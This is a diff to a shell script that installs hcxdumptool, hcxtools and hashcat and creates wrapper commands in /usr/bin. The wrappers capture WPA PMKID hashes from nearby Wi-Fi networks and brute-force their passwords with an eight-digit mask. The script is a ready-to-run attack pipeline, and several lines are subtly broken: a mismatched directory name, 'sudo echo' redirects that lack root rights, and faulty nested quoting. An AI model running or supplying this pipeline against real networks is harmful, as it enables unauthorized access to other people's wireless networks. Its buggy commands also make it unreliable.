@@ -1,3 +1,15 @@
-hcxdumptool -o test.pcapng -i wlan1mon --enable_status 3 && hcxpcaptool -z test.16800 test.pcapng
-# This is NOT do﻿ne on the Pineapple!!!
-# hashcat -m 16800 te﻿st.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
+mkdir ~/.pmkid && cd pmkid;
+git clone https://github.com/zerbea/hcxdumptool;
+git clone https://github.com/zerbea/hcxtools;
+git clone https://github.com/hashcat/hashcat;
+sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev;
+cd hcxdumptool && make && sudo make install;
+cd ~/.pmkid/hcxtools && make && sudo make install;
+cd ~/.pmkid/hashcat && make && sudo make install;
+sudo echo "cd ~/.pmkid; sudo hcxdumptool -i mon0 -o test.pcapng --enable_status 15" >> /usr/bin/pmkid-dump; sudo chmod 755 /usr/bin/pmkid-dump;
+sudo echo "cd ~/.pmkid; awk -F "*" '{ system("echo " $4 " | xxd -r -p; echo" ) }' test.16800" >> /usr/bin/pmkid-list; sudo chmod 755 /usr/bin/pmkid-list;
+sudo echo "cd ~/.pmkid; sudo hcxpcaptool -z test.16800 test.pcapng" >> /usr/bin/pmkid-test; sudo chmod 755 /usr/bin/pmkid-test;
+sudo echo "cd ~/.pmkid; hashcat -m 16800 -a 3 -w 3 -o cracked.txt test.16800 ?d?d?d?d?d?d?d?d" >> /usr/bin/pmkid-crack; sudo chmod 755 /usr/bin/pmkid-crack;
+sudo echo "cd ~/.pmkid; rm -rf test.*" >> /usr/bin/pmkid-clean; sudo chmod 755 /usr/bin/pmkid-clean;
+cd ~/.pmkid && sudo rm -rf hcx* hashcat; cd;
+pmkid-dump && pmkid-test && pmkid-list && pmkid-crack
